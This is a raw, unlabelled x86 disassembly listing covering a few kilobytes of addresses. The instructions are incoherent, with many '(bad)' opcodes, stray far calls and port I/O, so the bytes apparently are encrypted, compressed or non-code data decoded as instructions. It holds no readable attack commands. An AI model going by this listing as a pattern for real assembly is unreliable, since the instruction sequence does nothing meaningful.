  4071c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071c6:	dec    esp
  4071c7:	ja     0x40716f
  4071c9:	sbb    DWORD PTR [edi-0x1e],ebp
  4071cc:	add    DWORD PTR [ebp+0x23],ebx
  4071cf:	sahf   
  4071d0:	scas   eax,DWORD PTR es:[edi]
  4071d1:	cmp    dh,cl
  4071d3:	mov    ebp,DWORD PTR [eax-0x27]
  4071d6:	nop
  4071d7:	pop    eax
  4071d8:	or     eax,0xac65315c
  4071dd:	gs add dh,ah
  4071e0:	inc    ebx
  4071e1:	mov    ebp,DWORD PTR [ecx]
  4071e3:	push   cs
  4071e4:	sbb    DWORD PTR [eax],esi
  4071e6:	call   0xf070:0x4ef4935c
  4071ed:	push   0xc
  4071ef:	outs   dx,DWORD PTR ds:[esi]
  4071f0:	fbstp  TBYTE PTR ds:0x49590b12
  4071f6:	lock mov ds:0xc83b958b,ax
  4071fd:	hlt    
  4071fe:	sub    BYTE PTR [ebp-0x62],ch
  407201:	mov    esi,0x471c3740
  407206:	jge    0x4071d1
  407208:	sahf   
  407209:	xor    DWORD PTR ss:[ebp-0x27ca447f],ebp
  407210:	xchg   edi,eax
  407211:	out    dx,al
  407212:	outs   dx,DWORD PTR ds:[esi]
  407213:	mov    eax,ds:0x18a1db86
  407218:	sbb    BYTE PTR [edx+0x2b],al
  40721b:	inc    ebp
  40721c:	data16 jg 0x4071cb
  40721f:	push   esp
  407220:	inc    ecx
  407221:	ret    
  407222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407223:	mov    al,0xbc
  407225:	xchg   esp,eax
  407226:	cmp    BYTE PTR [esi],dh
  407228:	leave  
  407229:	mov    cl,0x2e
  40722b:	jbe    0x407246
  40722d:	fwait
  40722e:	add    eax,0x966f3a5b
  407233:	(bad)  
  407234:	jecxz  0x40724c
  407236:	loope  0x4072b5
  407238:	mov    ah,0x8f
  40723a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40723b:	xchg   ebx,eax
  40723c:	cwde   
  40723d:	xchg   ecx,eax
  40723e:	iret   
  40723f:	js     0x407220
  407241:	or     eax,0x32ffcac3
  407246:	sub    BYTE PTR [eax],bh
  407248:	shl    dh,cl
  40724a:	xchg   ebx,eax
  40724b:	cmp    ah,BYTE PTR [ebx]
  40724d:	sub    dl,BYTE PTR ds:0x90d08969
  407253:	push   es
  407254:	push   esi
  407255:	push   ebx
  407256:	push   ecx
  407257:	or     BYTE PTR [edi+esi*2],dl
  40725a:	imul   ebp,DWORD PTR [esi-0x549d84b7],0xce8db854
  407264:	inc    edi
  407265:	fimul  DWORD PTR [esi-0x73]
  407268:	je     0x407228
  40726a:	push   0xfffffff9
  40726c:	cdq    
  40726d:	cwde   
  40726e:	or     BYTE PTR [eax-0x18ea8a4f],ah
  407274:	loop   0x407235
  407276:	and    bh,al
  407278:	imul   esp,DWORD PTR [edx-0x4],0x79dbba27
  40727f:	scas   eax,DWORD PTR es:[edi]
  407280:	add    BYTE PTR [edx+0x9],dl
  407283:	pop    ebx
  407284:	pop    eax
  407285:	cwde   
  407286:	mov    DWORD PTR [esi],eax
  407288:	jecxz  0x4072fe
  40728a:	fs cmp eax,0xc0bd7885
  407290:	je     0x4072b3
  407292:	jne    0x407289
  407294:	sbb    al,0x55
  407296:	sub    BYTE PTR [ecx-0x74],dl
  407299:	fadd   DWORD PTR [eax]
  40729b:	call   0xe5e3:0xd26ac993
  4072a2:	icebp  
  4072a3:	inc    edi
  4072a4:	xchg   edi,eax
  4072a5:	aaa    
  4072a6:	data16 jne 0x4072de
  4072a9:	(bad)  
  4072aa:	out    dx,eax
  4072ab:	inc    ecx
  4072ac:	push   ecx
  4072ad:	aas    
  4072ae:	cdq    
  4072af:	add    al,0xe8
  4072b1:	loopne 0x4072e2
  4072b3:	sbb    DWORD PTR [ecx-0x1f],0x75
  4072b7:	mov    al,0x94
  4072b9:	aam    0xc1
  4072bb:	dec    ebp
  4072bc:	in     eax,0xac
  4072be:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072c0:	mov    edi,0xce1d788
  4072c5:	aaa    
  4072c6:	push   0x6d03bcf8
  4072cb:	repnz xchg ebx,eax
  4072cd:	jno    0x407348
  4072cf:	fidivr WORD PTR ds:0xe4289052
  4072d5:	inc    edi
  4072d6:	(bad)  
  4072d7:	pop    edx
  4072d8:	or     edx,ecx
  4072da:	xchg   esp,eax
  4072db:	test   eax,0x31616e8d
  4072e0:	psrlq  mm0,QWORD PTR [ecx+eiz*4-0x3b]
  4072e5:	or     ebx,DWORD PTR [edi]
  4072e7:	mov    ah,0x6
  4072e9:	add    eax,0xcc04985e
  4072ee:	pusha  
  4072ef:	test   al,0x5d
  4072f1:	xor    al,al
  4072f3:	out    dx,eax
  4072f4:	loopne 0x407310
  4072f6:	push   es
  4072f7:	mov    eax,0x440f57c6
  4072fc:	pop    ebp
  4072fd:	push   eax
  4072fe:	(bad)  
  4072ff:	aaa    
  407300:	sbb    al,0xcf
  407302:	arpl   WORD PTR [edi-0x3a],cx
  407305:	inc    edx
  407306:	jl     0x4072ff
  407308:	rol    ch,1
  40730a:	push   ss
  40730b:	mov    eax,0xb6678570
  407310:	dec    esp
  407311:	sti    
  407312:	push   esi
  407313:	inc    edx
  407314:	dec    esp
  407315:	cld    
  407316:	mov    bl,0x50
  407318:	dec    ebx
  407319:	xchg   eax,eax
  40731b:	mov    esi,0xcb1634e4
  407320:	fist   DWORD PTR [eax-0x32]
  407323:	in     al,0x16
  407325:	cwde   
  407326:	sahf   
  407327:	jae    0x40731a
  407329:	push   ds
  40732a:	mov    al,ds:0xfc3e6a9f
  40732f:	or     BYTE PTR [ecx+0x14794e3a],0xad
  407336:	mov    dh,0xa4
  407338:	xor    eax,0x6018accc
  40733d:	cs mov dh,dh
  407340:	call   0x50f34e0d
  407345:	hlt    
  407346:	(bad)  
  407347:	fldenv [ecx]
  407349:	outs   dx,BYTE PTR ds:[esi]
  40734a:	fstp   TBYTE PTR [ebx-0x6]
  40734d:	cmp    eax,ebp
  40734f:	cli    
  407350:	lods   al,BYTE PTR ds:[esi]
  407351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407352:	sub    ah,BYTE PTR [ebx-0x1d43f0a3]
  407358:	dec    esp
  407359:	int3   
  40735a:	sbb    al,0xf1
  40735c:	sbb    ebx,DWORD PTR [edi-0x837d9b8]
  407362:	sbb    BYTE PTR [ebp-0x7e],dl
  407365:	add    eax,0x1778d985
  40736a:	jge    0x4073da
  40736c:	aam    0x0
  40736e:	sbb    esi,DWORD PTR [ecx+0x67]
  407371:	jae    0x407383
  407373:	ds (bad) 
  407375:	jno    0x40732a
  407377:	cli    
  407378:	mov    ds:0xbd8d7052,eax
  40737d:	pop    ds
  40737e:	inc    esi
  40737f:	xor    eax,esi
  407381:	and    ah,BYTE PTR [edx]
  407383:	pop    ebx
  407384:	inc    ecx
  407385:	cdq    
  407386:	push   ebp
  407387:	lock daa 
  407389:	jno    0x4073e4
  40738b:	and    cl,BYTE PTR [esi+0x382d4592]
  407391:	popa   
  407392:	pop    es
  407393:	dec    edx
  407394:	sbb    dl,BYTE PTR [edx-0x3]
  407397:	mov    al,ds:0x1999bf04
  40739c:	fsubr  QWORD PTR [edi+0x4f06b52]
  4073a2:	(bad)  
  4073a3:	repz sbb DWORD PTR [ecx+0x210235a2],ebx
  4073aa:	fdiv   st(3),st
  4073ac:	popa   
  4073ad:	sahf   
  4073ae:	and    eax,0x94d94e64
  4073b3:	cli    
  4073b4:	mov    bl,0xb7
  4073b6:	push   0xab93857
  4073bb:	stos   DWORD PTR es:[edi],eax
  4073bc:	pop    DWORD PTR [edi]
  4073be:	xlat   BYTE PTR ds:[ebx]
  4073bf:	xor    cl,bh
  4073c1:	jge    0x4073d0
  4073c3:	lds    ebx,FWORD PTR [ebx+0x2fde01d0]
  4073c9:	fcmovb st,st(2)
  4073cb:	and    edx,DWORD PTR [eax]
  4073cd:	xchg   BYTE PTR [edx-0x19],dh
  4073d0:	xchg   ebx,eax
  4073d1:	push   ebp
  4073d2:	pop    esp
  4073d3:	dec    edx
  4073d4:	pop    ebx
  4073d5:	adc    eax,0xb7b0c4a9
  4073da:	inc    eax
  4073db:	xor    DWORD PTR [edi+0x110b7c59],eax
  4073e1:	icebp  
  4073e2:	mov    ah,BYTE PTR [esi]
  4073e4:	rol    ebp,1
  4073e6:	mov    dh,0xaf
  4073e8:	dec    esi
  4073e9:	pop    edi
  4073ea:	xlat   BYTE PTR ds:[ebx]
  4073eb:	fs test eax,0x2722fab7
  4073f1:	hlt    
  4073f2:	dec    ch
  4073f4:	cwde   
  4073f5:	shr    DWORD PTR [edi],0xb8
  4073f8:	mov    esp,0x66ff0bae
  4073fd:	aas    
  4073fe:	xchg   edx,eax
  4073ff:	sub    edi,edx
  407401:	out    0xbb,al
  407403:	mov    al,ds:0x26266fa
  407408:	div    BYTE PTR [eax+ecx*8]
  40740b:	nop
  40740c:	sar    DWORD PTR [edx-0x20],cl
  40740f:	push   ebp
  407410:	push   eax
  407411:	inc    esp
  407412:	loope  0x4073fe
  407414:	jnp    0x4073d9
  407416:	jmp    0x4fd0:0xc23d952e
  40741d:	rol    BYTE PTR [ebx],1
  40741f:	xor    BYTE PTR [ebx+0x6cae1bc7],dl
  407425:	dec    esp
  407426:	sbb    eax,0x1865ad25
  40742b:	lock nop
  40742d:	cmp    cl,BYTE PTR [ecx+edi*8]
  407430:	inc    ecx
  407431:	push   eax
  407432:	aas    
  407433:	ja     0x4073c1
  407435:	adc    BYTE PTR [ebp-0xa],ah
  407438:	pop    ds
  407439:	ja     0x4073f1
  40743b:	jmp    0x89fa:0x32534994
  407442:	aam    0x3d
  407444:	and    al,BYTE PTR [eax+0x2bb21c2b]
  40744a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40744b:	or     ah,BYTE PTR [eax-0x4ec89b7f]
  407451:	mov    edi,0xb8362226
  407456:	pop    edx
  407457:	mov    BYTE PTR [edi-0x6b811298],bh
  40745d:	out    dx,al
  40745e:	mov    esp,0x180c3141
  407463:	inc    esi
  407464:	in     eax,0x7
  407466:	cs add eax,0x1f8b6505
  40746c:	arpl   WORD PTR [ebp-0x47d1e797],bp
  407472:	leave  
  407473:	pop    DWORD PTR [ebx]
  407475:	mov    dl,0x26
  407477:	loopne 0x407433
  407479:	inc    edi
  40747a:	in     eax,0x6f
  40747c:	xchg   edx,eax
  40747d:	xlat   BYTE PTR ds:[ebx]
  40747e:	not    BYTE PTR [ebp-0x948f082]
  407484:	jp     0x4074c4
  407486:	cmp    al,0x3e
  407488:	in     al,0x9c
  40748a:	cdq    
  40748b:	cmp    eax,0xc1a17eb0
  407490:	adc    BYTE PTR [ebp-0x19],al
  407493:	ror    BYTE PTR [eax],1
  407495:	adc    al,0x14
  407497:	fst    DWORD PTR [edx+ecx*2]
  40749a:	jp     0x40750f
  40749c:	pop    edi
  40749d:	cdq    
  40749e:	out    0x24,eax
  4074a0:	and    al,0xd6
  4074a2:	dec    DWORD PTR [ecx-0x10]
  4074a5:	fst    DWORD PTR [esi+0x60b344ef]
  4074ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074ac:	pop    ebx
  4074ad:	cld    
  4074ae:	jne    0x4074e2
  4074b0:	inc    esp
  4074b1:	pop    ds
  4074b2:	mov    DWORD PTR [edx],eax
  4074b4:	jle    0x407513
  4074b6:	jae    0x40752c
  4074b8:	(bad)  
  4074b9:	int3   
  4074ba:	out    dx,al
  4074bb:	dec    ebx
  4074bc:	dec    ebp
  4074bd:	outs   dx,DWORD PTR ds:[esi]
  4074be:	xor    ebp,eax
  4074c0:	jbe    0x407539
  4074c2:	pop    ebp
  4074c3:	dec    esp
  4074c4:	pop    edx
  4074c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074c6:	fwait
  4074c7:	jecxz  0x4074a8
  4074c9:	out    0xd,eax
  4074cb:	in     al,0x47
  4074cd:	jns    0x40745f
  4074cf:	sbb    eax,0x8ab051e6
  4074d4:	add    bh,BYTE PTR [esi-0x4471459c]
  4074da:	adc    ah,bl
  4074dc:	test   BYTE PTR [ecx-0x26714346],ah
  4074e2:	xchg   esp,eax
  4074e3:	sbb    ch,BYTE PTR [eax+0x27d3058d]
  4074e9:	mov    ds:0xdc26ae3d,eax
  4074ee:	into   
  4074ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074f0:	dec    ebx
  4074f1:	add    ecx,DWORD PTR [edi+0x4b]
  4074f4:	and    esp,DWORD PTR [eax]
  4074f6:	lods   al,BYTE PTR ds:[esi]
  4074f7:	xchg   esi,eax
  4074f8:	cmp    bh,BYTE PTR [ebx+0x2c]
  4074fb:	arpl   WORD PTR [ebx],cx
  4074fd:	add    al,BYTE PTR [ebx]
  4074ff:	sub    esi,edx
  407501:	loop   0x4074e4
  407503:	popf   
  407504:	push   0x2a
  407506:	test   al,0x3a
  407508:	stos   DWORD PTR es:[edi],eax
  407509:	cmp    esp,esi
  40750b:	mov    edx,0x689e73d7
  407510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407511:	jmp    0x32f7:0x9eef9331
  407518:	out    0xdf,al
  40751a:	and    eax,DWORD PTR [edi]
  40751c:	cwde   
  40751d:	cli    
  40751e:	sbb    al,0xc5
  407520:	jo     0x407534
  407522:	adc    al,BYTE PTR fs:[edx+0x1e]
  407526:	call   0x803b:0xe6d0504f
  40752d:	jno    0x4074b9
  40752f:	inc    esi
  407530:	adc    al,0xa6
  407532:	rcl    edx,1
  407534:	jp     0x4074c2
  407536:	repz jae 0x407574
  407539:	jnp    0x4074fd
  40753b:	mov    ecx,0x6b9d2cd4
  407540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407541:	fnstcw WORD PTR [ecx+ebp*2]
  407544:	add    ebp,esi
  407546:	iret   
  407547:	sub    dl,dh
  407549:	add    eax,0x2f5f4d92
  40754e:	rol    DWORD PTR [esi+esi*4-0x3],0x7b
  407553:	jmp    0x297a:0x8677d883
  40755a:	sbb    ah,0xbd
  40755d:	mov    cs,edx
  40755f:	add    eax,0xeb926cf
  407564:	pop    edi
  407565:	jg     0x40756c
  407567:	xor    al,0xa2
  407569:	enter  0x7c45,0x25
  40756d:	mov    dl,0xd6
  40756f:	popa   
  407570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407571:	jecxz  0x4075c7
  407573:	mov    al,BYTE PTR [ebx]
  407575:	lea    ecx,[esi+esi*4-0x4aa15c6a]
  40757c:	xchg   edx,eax
  40757d:	xlat   BYTE PTR ds:[ebx]
  40757e:	adc    edi,ecx
  407580:	stc    
  407581:	retf   
  407582:	add    eax,0xd969b358
  407587:	pop    esp
  407588:	or     eax,0x2c3ba161
  40758d:	jno    0x40758f
  40758f:	mov    ah,0x29
  407591:	inc    ebx
  407592:	mov    esp,0x57b49c
  407597:	adc    DWORD PTR [ebx-0x6b104686],0x63
  40759e:	popa   
  40759f:	popa   
  4075a0:	ds sub bh,al
  4075a3:	push   esi
  4075a5:	push   0xffffffe5
  4075a7:	lods   al,BYTE PTR ds:[esi]
  4075a8:	jo     0x4075f5
  4075aa:	loope  0x4075b7
  4075ac:	cmp    al,0x6c
  4075ae:	mov    dl,0x68
  4075b0:	cld    
  4075b1:	in     eax,0xf4
  4075b3:	es pushf 
  4075b5:	fisttp WORD PTR [ebx+0x6c]
  4075b8:	(bad)  
  4075b9:	push   ebp
  4075ba:	popa   
  4075bb:	mul    BYTE PTR [edx+edi*4]
  4075be:	inc    esi
  4075bf:	ins    DWORD PTR es:[edi],dx
  4075c0:	dec    edx
  4075c1:	xor    eax,0xfba75daf
  4075c6:	test   eax,0xe590948c
  4075cb:	test   DWORD PTR [ebx],0xb20b618b
  4075d1:	inc    esi
  4075d2:	push   eax
  4075d3:	ins    BYTE PTR es:[edi],dx
  4075d4:	add    BYTE PTR [edx-0xf],dl
  4075d7:	lods   eax,DWORD PTR ds:[esi]
  4075d8:	sub    bh,BYTE PTR [edi-0x3a]
  4075db:	arpl   WORD PTR [ebx],dx
  4075dd:	sbb    DWORD PTR [ebx-0x25],edx
  4075e0:	loopne 0x4075fe
  4075e2:	jnp    0x40761a
  4075e4:	loopne 0x4075d6
  4075e6:	add    ch,BYTE PTR [ebp-0x53061456]
  4075ec:	cmp    DWORD PTR [ebp-0x474873a9],edx
  4075f2:	leave  
  4075f3:	dec    esp
  4075f4:	inc    edx
  4075f5:	repz repnz sbb al,0x82
  4075f9:	mov    edx,0x4367bfc5
  4075fe:	cmp    ch,BYTE PTR [esi+0x236c6e36]
  407604:	les    ecx,FWORD PTR [eax+0x78c131f8]
  40760a:	jne    0x40765e
  40760c:	mov    ecx,0xf5161ee5
  407611:	xor    DWORD PTR [edi],ebx
  407613:	lock imul ebx,DWORD PTR [ebx+ecx*4],0xd
  407618:	push   0xffffffa4
  40761a:	mov    ds:0x3e11499a,eax
  40761f:	test   al,0x6
  407621:	inc    ebp
  407622:	sub    esp,ebx
  407624:	rcr    BYTE PTR [ebp-0x436b5853],1
  40762a:	arpl   WORD PTR [ebx+ebx*4],ax
  40762d:	popa   
  40762e:	push   0xc86e06ad
  407633:	and    al,0x4c
  407635:	pop    ecx
  407636:	fprem  
  407638:	shl    BYTE PTR [ecx+0x1d],0xf2
  40763c:	test   DWORD PTR [eax-0x9a01782],0x50e854c6
  407646:	ficomp WORD PTR [ecx+0x7c]
  407649:	ret    0x69ce
  40764c:	inc    edi
  40764d:	mov    al,ds:0x64c76321
  407652:	pop    esp
  407653:	xchg   edi,eax
  407654:	fidivr DWORD PTR [edi+0xb82ff25]
  40765a:	xor    eax,0x374cb26
  40765f:	mov    esp,0xce2ca258
  407664:	loopne 0x4076ca
  407666:	lock or DWORD PTR [ebp-0x7b],ebx
  40766a:	cmp    eax,0x2033d9e4
  40766f:	in     eax,0x8f
  407671:	xor    esp,DWORD PTR [ecx+0x3d]
  407674:	sbb    BYTE PTR [ebx+0x6b],0x4c
  407678:	iret   
  407679:	push   ds
  40767a:	scas   eax,DWORD PTR es:[edi]
  40767b:	push   ebx
  40767c:	stos   BYTE PTR es:[edi],al
  40767d:	ret    
  40767e:	(bad)  
  40767f:	pusha  
  407680:	mov    esi,0x7b137cc7
  407685:	pop    ebx
  407686:	mov    eax,0x46c52529
  40768b:	mov    ch,0x40
  40768d:	invd   
  40768f:	std    
  407690:	mov    edi,0xe8b8dabf
  407695:	std    
  407696:	fucomip st,st(0)
  407698:	jae    0x4076b2
  40769a:	clc    
  40769b:	(bad)  
  40769c:	jecxz  0x4076e6
  40769e:	retf   0x9175
  4076a1:	shr    BYTE PTR [edi+0x18],cl
  4076a4:	inc    ecx
  4076a5:	xchg   edi,eax
  4076a6:	cmp    DWORD PTR [ebx+edi*4+0x2c605111],ecx
  4076ad:	sbb    al,0xdc
  4076af:	pop    ebp
  4076b0:	sbb    al,BYTE PTR [edi]
  4076b2:	out    dx,ax
  4076b4:	mov    BYTE PTR [edi-0x5817b04a],0x3c
  4076bb:	mov    ebx,0x5ec9ee81
  4076c0:	xor    BYTE PTR [ebp-0x6f],al
  4076c3:	(bad)
  4076c8:	push   cs
  4076c9:	loopne 0x407722
  4076cb:	dec    edi
  4076cc:	adc    al,0x3f
  4076ce:	in     al,dx
  4076cf:	pop    ds
  4076d0:	push   ebp
  4076d1:	out    0xf9,eax
  4076d3:	mov    esp,0x8ebf900f
  4076d8:	ins    DWORD PTR es:[edi],dx
  4076d9:	push   edx
  4076da:	(bad)  
  4076db:	jmp    0xff18:0xc94a866
  4076e2:	std    
  4076e3:	sbb    edx,DWORD PTR [ebx+0x18f61c43]
  4076e9:	mov    esp,DWORD PTR ds:0x85ced4dd
  4076ef:	nop
  4076f0:	fadd   QWORD PTR [ebx-0x15]
  4076f3:	imul   eax,DWORD PTR cs:[ebx],0x50134e61
  4076fa:	mov    BYTE PTR [ebx+0x5],ah
  4076fd:	fbld   TBYTE PTR ds:0x64ae306c
  407703:	cmp    BYTE PTR [esi],cl
  407705:	lods   al,BYTE PTR ds:[esi]
  407706:	or     al,0x42
  407708:	ret    0xaf5d
  40770b:	and    eax,0x3d23e83a
  407710:	pop    ecx
  407711:	or     DWORD PTR [eax],edi
  407713:	pop    ebp
  407714:	outs   dx,BYTE PTR ds:[esi]
  407715:	pop    ecx
  407716:	add    al,0x6d
  407718:	mov    ds:0xb943465f,eax
  40771d:	sbb    BYTE PTR [ebp-0x6b],0x37
  407721:	jg     0x40773a
  407723:	ins    DWORD PTR es:[edi],dx
  407724:	mov    eax,fs:0x393e2a41
  40772a:	xor    dl,BYTE PTR gs:[esi+0x15]
  40772e:	or     eax,0x8593ad42
  407733:	scas   al,BYTE PTR es:[edi]
  407734:	and    al,0xa
  407736:	fcomp  st(2)
  407738:	push   ss
  407739:	(bad)  
  40773a:	aam    0xc2
  40773c:	xchg   DWORD PTR [ecx],ecx
  40773e:	inc    ebp
  40773f:	cmp    bl,cl
  407741:	add    bh,BYTE PTR [ebx+0x64]
  407744:	dec    ecx
  407745:	cld    
  407746:	repz xchg esp,eax
  407748:	jl     0x407732
  40774a:	mov    bh,0xe1
  40774d:	ds xchg ebx,eax
  40774f:	retf   
  407750:	or     DWORD PTR [eax-0x28],0xc2d25355
  407757:	je     0x40773b
  407759:	inc    edi
  40775a:	cmp    ecx,edx
  40775c:	cwde   
  40775d:	add    ebp,DWORD PTR ds:0xb05f8e11
  407763:	repnz mov ch,0xae
  407766:	push   esi
  407767:	sbb    al,0x3e
  407769:	fidivr WORD PTR [esi+ebx*4]
  40776c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40776d:	add    DWORD PTR [ecx+0x65c98d28],ecx
  407773:	mov    ecx,0x34346ca3
  407778:	sbb    eax,0xa99c9559
  40777d:	jp     0x4077bb
  40777f:	lahf   
  407780:	sub    edi,DWORD PTR [ecx-0x271ef112]
  407786:	pop    esp
  407787:	inc    eax
  407788:	pop    esi
  407789:	sahf   
  40778a:	add    al,0x62
  40778c:	xor    BYTE PTR [ecx+0xf0263bb],al
  407792:	es push ss
  407794:	xchg   esp,eax
  407795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407796:	daa    
  407797:	jmp    DWORD PTR ds:0x1187b9ce
  40779d:	sbb    al,0x2b
  40779f:	cmp    DWORD PTR [ebx+ebp*2-0x10],edi
  4077a3:	fdiv   DWORD PTR [ebp-0x3e206103]
  4077a9:	enter  0x3e21,0x80
  4077ad:	xchg   ecx,eax
  4077ae:	or     ch,BYTE PTR [ecx-0x25]
  4077b1:	(bad)  
  4077b2:	mov    ebp,0x306c5f43
  4077b7:	bound  ebp,QWORD PTR [edi-0x114393d5]
  4077bd:	fst    DWORD PTR [esi-0x7f8b0947]
  4077c3:	cmp    al,0x59
  4077c5:	jno    0x4077c2
  4077c7:	cld    
  4077c8:	add    DWORD PTR [ecx],0xffffffd0
  4077cb:	stc    
  4077cc:	sub    al,0x40
  4077ce:	aas    
  4077cf:	xor    cl,BYTE PTR [ecx+esi*2]
  4077d2:	dec    esi
  4077d3:	cmp    dh,BYTE PTR [ecx+0x24]
  4077d6:	retf   
  4077d7:	fisttp DWORD PTR [edi+0x5ac2b8d]
  4077dd:	repnz aam 0xb
  4077e0:	sub    esp,DWORD PTR [ebx]
  4077e2:	lahf   
  4077e3:	das    
  4077e4:	fmul   QWORD PTR [esi]
  4077e6:	mov    bh,0x18
  4077e8:	daa    
  4077e9:	xchg   esp,eax
  4077ea:	test   eax,0xf294a4c7
  4077ef:	shl    edi,1
  4077f1:	push   ecx
  4077f2:	lods   eax,DWORD PTR ds:[esi]
  4077f3:	push   eax
  4077f4:	cmc    
  4077f5:	out    dx,al
  4077f6:	leave  
  4077f7:	xchg   esi,eax
  4077f8:	pop    ecx
  4077f9:	or     eax,edi
  4077fb:	stos   BYTE PTR es:[edi],al
  4077fc:	push   eax
  4077fd:	clc    
  4077fe:	lds    ebx,FWORD PTR ds:0x97556e48
  407804:	cs dec eax
  407806:	mov    bl,0x6
  407808:	jae    0x4077ca
  40780a:	(bad)  
  40780b:	repz pop ebp
  40780d:	mov    bl,0xd2
  40780f:	xchg   ebx,eax
  407810:	ret    0x5a90
  407813:	jno    0x407834
  407815:	sbb    esp,DWORD PTR [ecx+0x59c59cd2]
  40781b:	pop    eax
  40781c:	popa   
  40781d:	outs   dx,BYTE PTR ds:[si]
  40781f:	test   DWORD PTR [edx-0x67],ecx
  407822:	popa   
  407823:	jbe    0x4077bb
  407825:	scas   eax,DWORD PTR es:[edi]
  407826:	leave  
  407827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407828:	push   es
  407829:	pop    ss
  40782a:	out    0xed,eax
  40782c:	push   esp
  40782d:	push   esi
  40782e:	xlat   BYTE PTR ds:[ebx]
  40782f:	inc    ebp
  407830:	addr16 fsubr st,st(0)
  407833:	cmovbe ecx,DWORD PTR [ebp+ebp*8+0x5bb9cd1b]
  40783b:	cli    
  40783c:	div    BYTE PTR [esi+0x1cc85c40]
  407842:	popf   
  407843:	std    
  407844:	gs mov dl,0xf
  407847:	push   ebp
  407848:	pop    esp
  407849:	inc    esp
  40784a:	adc    eax,DWORD PTR [edx]
  40784c:	push   ebx
  40784d:	sbb    eax,0x9e3c6bd1
  407852:	or     esp,DWORD PTR [eax-0x26]
  407855:	jo     0x407875
  407857:	mov    dl,BYTE PTR gs:[ebp+0xf]
  40785b:	repz mov cl,0xb5
  40785e:	test   BYTE PTR [esi],0x19
  407861:	scas   eax,DWORD PTR es:[edi]
  407862:	iret   
  407863:	(bad)  
  407864:	cli    
  407865:	js     0x4078b2
  407867:	(bad)  
  407868:	mov    ds:0x8ad91566,al
  40786d:	test   DWORD PTR [edi-0x62],ecx
  407870:	es or  dl,dh
  407873:	push   es
  407874:	(bad)  
  407875:	jge    0x4078e4
  407877:	je     0x4078a3
  407879:	adc    dh,BYTE PTR [eax-0x15]
  40787c:	out    0x40,al
  40787e:	cmp    BYTE PTR [ebp*4+0x3a4cf6f],al
  407885:	sbb    BYTE PTR es:[ecx+0x2f3ea0c6],dh
  40788c:	jo     0x4078fa
  40788e:	out    dx,al
  40788f:	inc    edi
  407890:	arpl   di,si
  407892:	sub    eax,0xaa4f723c
  407897:	add    al,0x7
  407899:	mov    edi,0x11b743d9
  40789e:	xchg   esi,eax
  40789f:	sub    dl,ch
  4078a1:	sahf   
  4078a2:	outs   dx,BYTE PTR ds:[esi]
  4078a3:	sbb    al,0x46
  4078a5:	jmp    0x4078a0
  4078a7:	xor    eax,0xdae76f6
  4078ac:	popf   
  4078ad:	cmp    bh,dl
  4078af:	mov    ds:0xd0e9214b,eax
  4078b4:	or     al,BYTE PTR [edi+0x10]
  4078b7:	or     dl,BYTE PTR [edi+0x5fca7585]
  4078bd:	inc    edi
  4078be:	cld    
  4078bf:	push   ebx
  4078c0:	jle    0x407847
  4078c2:	out    dx,eax
  4078c3:	daa    
  4078c4:	jl     0x407865
  4078c6:	xchg   ecx,eax
  4078c7:	dec    ebp
  4078c8:	xchg   ebx,eax
  4078c9:	mov    bl,0xee
  4078cb:	pop    ecx
  4078cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078cd:	mov    ebp,0xe7727ba1
  4078d2:	xchg   esp,eax
  4078d3:	xor    bh,bl
  4078d5:	loop   0x4078e0
  4078d7:	sbb    al,ah
  4078d9:	add    eax,DWORD PTR gs:[edi-0x4a76fa8b]
  4078e0:	or     eax,0xe4c4d620
  4078e5:	mov    esi,DWORD PTR [eax+0x2d4743fd]
  4078eb:	or     ebp,DWORD PTR [edx-0x787dbda7]
  4078f1:	pop    edi
  4078f2:	sbb    esi,esp
  4078f4:	nop
  4078f5:	push   es
  4078f6:	or     esi,DWORD PTR [ebx+0xd]
  4078f9:	ret    0x42cf
  4078fc:	fcmovnb st,st(6)
  4078fe:	push   esi
  4078ff:	stos   DWORD PTR es:[edi],eax
  407900:	mov    esp,0x9e0299a2
  407905:	fsubr  DWORD PTR [ebx-0x60]
  407908:	xor    al,0x36
  40790a:	mov    bh,0xa4
  40790c:	mov    bl,0x12
  40790e:	inc    ebp
  40790f:	hlt    
  407910:	dec    esi
  407911:	inc    edx
  407912:	rol    BYTE PTR [esi+0x1],cl
  407915:	jp     0x4078a2
  407917:	inc    esi
  407918:	fucomi st,st(7)
  40791a:	test   ah,0xbd
  40791d:	sbb    eax,0xdff596d8
  407922:	ret    0x11d1
  407925:	stos   DWORD PTR es:[edi],eax
  407926:	iret   
  407927:	pushf  
  407928:	mov    bl,cl
  40792a:	sbb    eax,0x893a00cf
  40792f:	or     eax,0x310ec083
  407934:	cmp    al,cl
  407936:	cld    
  407937:	jbe    0x40790c
  407939:	pusha  
  40793a:	retf   
  40793b:	adc    al,0x52
  40793d:	(bad)  
  40793e:	bnd jnp 0x4078fb
  407941:	or     dh,BYTE PTR [esi+0x2a]
  407944:	pop    esi
  407945:	loope  0x407938
  407947:	mov    edi,DWORD PTR [ecx+eax*1-0x75b6f87a]
  40794e:	in     al,dx
  40794f:	sub    eax,0xf15ed7d8
  407954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407955:	mov    cl,0x4b
  407957:	mov    edi,0xe34f4de4
  40795c:	pop    ebp
  40795d:	pusha  
  40795e:	scas   al,BYTE PTR es:[edi]
  40795f:	pusha  
  407960:	xchg   ebp,eax
  407961:	or     eax,0x5ea8afb3
  407966:	mov    ebp,0x4d2e8e87
  40796b:	je     0x407914
  40796d:	xchg   ebx,eax
  40796e:	ja     0x407962
  407970:	mov    bh,0x69
  407972:	rcl    esi,1
